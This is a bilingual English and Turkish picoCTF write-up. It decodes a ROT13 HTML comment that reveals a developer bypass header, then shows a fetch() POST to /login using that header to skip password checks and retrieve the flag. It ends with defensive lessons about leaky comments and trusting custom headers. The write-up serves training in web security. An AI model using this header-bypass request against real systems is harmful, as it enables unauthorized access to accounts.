# 🇬🇧 English

## Challenge Overview

The objective of this challenge was to gain access to a restricted web portal using the email address **ctf-player@picoctf.org**. The password was intentionally unknown, so the goal was to discover an alternative authentication method hidden by the developers.

## Analysis

### Source Code Inspection

I began by inspecting the page source (`CTRL + U`). Inside the HTML comments, I found an encoded message.

```text
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
```

### ROT13 Decoding

The challenge hinted at using a **ROT13** cipher, which rotates each letter by 13 positions in the alphabet.

After decoding, the message became:

```text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

The decoded note revealed the existence of a hidden developer bypass mechanism.

## Solution

The message indicated that the application trusted requests containing a custom HTTP header:

```http
X-Dev-Access: yes
```

Using the browser's **Developer Tools (F12 → Console)**, I sent a custom POST request with the required header.

```javascript
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes'
    },
    body: JSON.stringify({
        email: 'ctf-player@picoctf.org',
        password: 'any'
    })
})
.then(res => res.json())
.then(data => console.log(data));
```

The server recognized the developer access header, bypassed the password verification process, and returned the flag.

---

## 💡 Key Takeaway

This challenge demonstrates several common web security concepts:

- **HTML comments** may unintentionally expose sensitive information.
- **ROT13** is merely an encoding technique, not encryption.
- Trusting custom HTTP headers for authentication is insecure because they can be easily manipulated by an attacker.
- Browser Developer Tools can be used to inspect, modify, and replay HTTP requests during security testing.

---

# 🇹🇷 Türkçe

## Challenge Özeti

Bu labda, **ctf-player@picoctf.org** e-posta adresiyle korumalı bir web portalına giriş yapmamız istendi. Ancak şifre bilinmediği için amaç, geliştiricilerin bıraktığı gizli bir giriş yöntemini (backdoor) veya ipucunu bulmaktı.

## Analiz

### Kaynak Kod İncelemesi

İlk olarak sayfanın kaynak kodunu (`CTRL + U`) inceledim. HTML yorum satırları arasında aşağıdaki kodlanmış metni buldum.

```text
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
```

### ROT13 Çözümü

Challenge ipucu, metnin **ROT13** algoritmasıyla kodlandığını gösteriyordu. ROT13, alfabedeki her harfi 13 karakter kaydırarak çalışan basit bir kodlama yöntemidir.

Metni çözdüğümde şu sonuca ulaştım:

```text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

Bu not, uygulamada geliştiricilere özel gizli bir doğrulama mekanizması bulunduğunu gösteriyordu.

## Çözüm

Notta belirtilen bilgiye göre, HTTP isteğine aşağıdaki özel başlığı eklemek kimlik doğrulamasını atlamaya yetiyordu.

```http
X-Dev-Access: yes
```

Tarayıcının **Geliştirici Araçları (F12 → Console)** bölümünü kullanarak gerekli header'ı içeren manuel bir POST isteği gönderdim.

```javascript
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes'
    },
    body: JSON.stringify({
        email: 'ctf-player@picoctf.org',
        password: 'any'
    })
})
.then(res => res.json())
.then(data => console.log(data));
```

Sunucu bu özel geliştirici başlığını algıladı, parola kontrolünü atladı ve flag'i başarıyla döndürdü.

---

## 💡 Çıkarım

Bu challenge, web güvenliğinde sık karşılaşılan bazı önemli kavramları göstermektedir.

- **HTML yorum satırları**, yanlışlıkla hassas bilgiler içerebilir.
- **ROT13**, bir şifreleme yöntemi değil, yalnızca basit bir kodlama (encoding) tekniğidir.
- Kimlik doğrulamasını yalnızca özel HTTP header'larına güvenerek yapmak güvenli değildir; bu başlıklar kolayca değiştirilebilir.
- Tarayıcıdaki **Developer Tools**, HTTP isteklerini incelemek ve gerektiğinde değiştirmek için oldukça güçlü araçlardır.
